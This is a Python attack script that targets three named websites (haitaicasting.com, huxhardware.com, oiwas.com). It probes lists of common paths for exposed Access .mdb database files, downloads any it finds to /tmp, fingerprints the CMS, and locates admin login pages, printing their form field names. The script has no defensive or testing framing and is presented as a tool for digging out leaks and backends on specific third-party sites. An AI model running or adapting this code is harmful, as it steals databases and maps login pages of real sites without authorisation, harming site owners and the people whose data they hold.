#!/usr/bin/env python3
"""asp3_deep.py - 3个可达ASP老站深挖: MDB+后台+漏洞"""
import urllib.request, urllib.parse, ssl, re

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0'}

def fetch(url, timeout=8):
    try:
        req = urllib.request.Request(url, headers=UA)
        r = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        return r.status, r.read(80000), r.geturl(), dict(r.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read(80000), e.geturl(), dict(e.headers)
    except Exception as e:
        return 0, repr(e).encode(), '', {}

MDB_PATHS = ['/db/database.mdb', '/data/database.mdb', '/database.mdb', '/db.mdb',
             '/data/data.mdb', '/databak.mdb', '/db/Data.mdb', '/inc/data.mdb',
             '/DataBase.mdb', '/mdb/db.mdb', '/data/ly.mdb', '/bbs/data/bbs.mdb',
             '/asp/database.mdb', '/conn/database.mdb', '/db/xx.mdb', '/data/access.mdb',
             '/databases/database.mdb', '/admin/database.mdb', '/Data.mdb']
ADMIN_PATHS = ['/admin/login.asp', '/admin/index.asp', '/admin/', '/manage/login.asp',
               '/houtai/login.asp', '/login.asp', '/admin/admin_login.asp', '/guanli/',
               '/admin/login.asp?act=login', '/Manager/login.asp', '/admin/admin.asp']

targets = ['haitaicasting.com', 'huxhardware.com', 'oiwas.com']

for d in targets:
    print('========== %s ==========' % d, flush=True)
    # 首页CMS
    st, b, fu, hd = fetch('http://' + d + '/')
    low = b.decode('gbk', 'ignore').lower()
    print('home: st=%d size=%d server=%s' % (st, len(b), hd.get('Server', '')[:30]), flush=True)
    for k in ['dedecms', '动易', '科汛', '风讯', '新云', '创力', 'pageadmin', 'aspcms', 'kingcms']:
        if k.lower() in low:
            print('  CMS mark:', k, flush=True)
    # MDB
    for mp in MDB_PATHS:
        st, b, fu, hd = fetch('http://' + d + mp)
        if st == 200 and len(b) > 500:
            magic = b[:8]
            is_mdb = magic[:4] == b'\x00\x01\x00\x00' or b'Standard Jet' in b[:64] or (len(b) > 5000 and b'\x00' in b[:100])
            if is_mdb:
                print('  *** MDB LEAK: %s (%d bytes) ***' % (mp, len(b)), flush=True)
                open('/tmp/' + d.replace('.', '_') + '_' + mp.strip('/').replace('/', '_') + '.mdb', 'wb').write(b)
            elif b'Standard Jet' in b[:200]:
                print('  MDB?', mp, len(b), flush=True)
    # 后台
    for ap in ADMIN_PATHS:
        st, b, fu, hd = fetch('http://' + d + ap)
        if st == 200 and len(b) > 300:
            lowb = b.decode('gbk', 'ignore').lower()
            has_pw = 'password' in lowb or 'type="password"' in lowb or 'pwd' in lowb or '登录' in lowb or 'user' in lowb
            if has_pw and '404' not in lowb[:100]:
                print('  ADMIN: %s (st=%d size=%d)' % (ap, st, len(b)), flush=True)
                print('    fields:', re.findall(r'name="([^"]+)"', b.decode('gbk', 'ignore'))[:8], flush=True)
    print('', flush=True)
print('=== DONE ===', flush=True)
